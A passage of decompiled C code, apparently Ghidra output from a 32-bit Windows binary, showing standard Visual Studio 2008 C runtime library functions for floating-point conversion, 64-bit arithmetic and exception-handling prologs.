  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  _LocaleUpdate local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate(local_28,_Locale);
  local_18 = FUN_004201cb((undefined2 *)&local_14,&local_2c,_Str,0,0,0,0,(int)local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_0041f285:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041f2c5;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_0041f2b7:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041f2c5;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_0041f2b7;
    goto LAB_0041f285;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_0041f2c5:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  _LocaleUpdate local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate(local_28,_Locale);
  local_18 = FUN_004201cb((undefined2 *)&local_14,&local_2c,_Str,0,0,0,0,(int)local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_0041f32d:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041f36d;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_0041f35f:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041f36d;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_0041f35f;
    goto LAB_0041f32d;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_0041f36d:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Single Match
//  __fptostr
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __fptostr(char *_Buf,size_t _SizeInBytes,int _Digits,STRFLT _PtFlt)

{
  int *piVar1;
  int iVar2;
  char *pcVar3;
  size_t sVar4;
  char cVar5;
  char *pcVar6;
  errno_t eVar7;
  
  pcVar6 = _PtFlt->mantissa;
  if ((_Buf == (char *)0x0) || (_SizeInBytes == 0)) {
    piVar1 = __errno();
    eVar7 = 0x16;
    *piVar1 = 0x16;
  }
  else {
    *_Buf = '\0';
    iVar2 = _Digits;
    if (_Digits < 1) {
      iVar2 = 0;
    }
    if (iVar2 + 1U < _SizeInBytes) {
      *_Buf = '0';
      pcVar3 = _Buf + 1;
      if (0 < _Digits) {
        do {
          cVar5 = *pcVar6;
          if (cVar5 == '\0') {
            cVar5 = '0';
          }
          else {
            pcVar6 = pcVar6 + 1;
          }
          *pcVar3 = cVar5;
          pcVar3 = pcVar3 + 1;
          _Digits = _Digits + -1;
        } while (0 < _Digits);
      }
      *pcVar3 = '\0';
      if ((-1 < _Digits) && ('4' < *pcVar6)) {
        while (pcVar3 = pcVar3 + -1, *pcVar3 == '9') {
          *pcVar3 = '0';
        }
        *pcVar3 = *pcVar3 + '\x01';
      }
      if (*_Buf == '1') {
        _PtFlt->decpt = _PtFlt->decpt + 1;
      }
      else {
        sVar4 = _strlen(_Buf + 1);
        _memmove(_Buf,_Buf + 1,sVar4 + 1);
      }
      return 0;
    }
    piVar1 = __errno();
    eVar7 = 0x22;
    *piVar1 = 0x22;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar7;
}



// Library Function - Single Match
//  ___dtold
// 
// Library: Visual Studio 2008 Release

void __cdecl ___dtold(uint *param_1,uint *param_2)

{
  uint uVar1;
  ushort uVar2;
  ushort uVar3;
  ushort uVar4;
  uint local_8;
  
  uVar2 = *(ushort *)((int)param_2 + 6) >> 4;
  uVar4 = *(ushort *)((int)param_2 + 6) & 0x8000;
  uVar3 = uVar2 & 0x7ff;
  uVar1 = *param_2;
  local_8 = 0x80000000;
  if ((uVar2 & 0x7ff) == 0) {
    if (((param_2[1] & 0xfffff) == 0) && (uVar1 == 0)) {
      param_1[1] = 0;
      *param_1 = 0;
      goto LAB_0041f4ef;
    }
    uVar3 = uVar3 + 0x3c01;
    local_8 = 0;
  }
  else if (uVar3 == 0x7ff) {
    uVar3 = 0x7fff;
  }
  else {
    uVar3 = uVar3 + 0x3c00;
  }
  param_1[1] = uVar1 >> 0x15 | (param_2[1] & 0xfffff) << 0xb | local_8;
  *param_1 = uVar1 << 0xb;
  while (local_8 == 0) {
    uVar1 = param_1[1];
    uVar3 = uVar3 - 1;
    param_1[1] = uVar1 * 2 | *param_1 >> 0x1f;
    *param_1 = *param_1 * 2;
    local_8 = uVar1 * 2 & 0x80000000;
  }
  uVar4 = uVar4 | uVar3;
LAB_0041f4ef:
  *(ushort *)(param_1 + 2) = uVar4;
  return;
}



// Library Function - Single Match
//  __fltout2
// 
// Library: Visual Studio 2008 Release

STRFLT __cdecl __fltout2(_CRT_DOUBLE _Dbl,STRFLT _Flt,char *_ResultStr,size_t _SizeInBytes)

{
  int iVar1;
  errno_t eVar2;
  STRFLT p_Var3;
  short local_30;
  char local_2e;
  char local_2c [24];
  uint local_14;
  uint uStack_10;
  ushort uStack_c;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  ___dtold(&local_14,(uint *)&_Dbl);
  iVar1 = __I10_OUTPUT(local_14,uStack_10,uStack_c,0x11,0,&local_30);
  _Flt->flag = iVar1;
  _Flt->sign = (int)local_2e;
  _Flt->decpt = (int)local_30;
  eVar2 = _strcpy_s(_ResultStr,_SizeInBytes,local_2c);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  _Flt->mantissa = _ResultStr;
  p_Var3 = (STRFLT)___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return p_Var3;
}



// Library Function - Single Match
//  __alldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __alldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullshr
// 
// Library: Visual Studio 2008 Release

ulonglong __fastcall __aullshr(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



// Library Function - Single Match
//  __controlfp_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __controlfp_s(uint *_CurrentState,uint _NewValue,uint _Mask)

{
  uint uVar1;
  int *piVar2;
  errno_t eVar3;
  
  uVar1 = _Mask & 0xfff7ffff;
  if ((_NewValue & uVar1 & 0xfcf0fce0) == 0) {
    if (_CurrentState == (uint *)0x0) {
      __control87(_NewValue,uVar1);
    }
    else {
      uVar1 = __control87(_NewValue,uVar1);
      *_CurrentState = uVar1;
    }
    eVar3 = 0;
  }
  else {
    if (_CurrentState != (uint *)0x0) {
      uVar1 = __control87(0,0);
      *_CurrentState = uVar1;
    }
    piVar2 = __errno();
    eVar3 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar3;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_catch
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3_catch(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *unaff_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_0042a044 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  *unaff_FS_OFFSET = (int)local_8;
  return;
}



// Library Function - Single Match
//  int __cdecl _ValidateRead(void const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl _ValidateRead(void *param_1,uint param_2)

{
  return (uint)(param_1 != (void *)0x0);
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2008 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_0041fc44;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_0042b6a8 - 1;
    iVar6 = (int)(DAT_0042b6a8 + ((int)DAT_0042b6a8 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_0042b6a8 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_0041f878;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_0041f87f;
LAB_0041f878:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_0041f87f:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_0041f88d;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_0041f88d:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_0042b6a4 - DAT_0042b6a8)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_0042b6a4 < iVar14) {
        if (iVar14 < DAT_0042b6a0) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_0042b6b4;
          iVar4 = (int)(DAT_0042b6ac + ((int)DAT_0042b6ac >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042b6ac & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_0042b6ac + ((int)DAT_0042b6ac >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042b6ac & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_0042b6b4 + DAT_0042b6a0;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_0041fc44;
      }
      local_14 = DAT_0042b6a4 - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_0042b6a8 - 1;
      iVar14 = (int)(DAT_0042b6a8 + ((int)DAT_0042b6a8 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_0042b6a8 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_0041fa30;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_0041fa30:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_0042b6ac + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_0041fc44:
  uVar13 = iVar14 << (0x1fU - (char)DAT_0042b6ac & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_0042b6b0 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_0042b6b0 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2008 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_00420188;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_0042b6c0 - 1;
    iVar6 = (int)(DAT_0042b6c0 + ((int)DAT_0042b6c0 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_0042b6c0 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_0041fdbc;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_0041fdc3;
LAB_0041fdbc:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_0041fdc3:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_0041fdd1;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_0041fdd1:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_0042b6bc - DAT_0042b6c0)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_0042b6bc < iVar14) {
        if (iVar14 < DAT_0042b6b8) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_0042b6cc;
          iVar4 = (int)(DAT_0042b6c4 + ((int)DAT_0042b6c4 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042b6c4 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
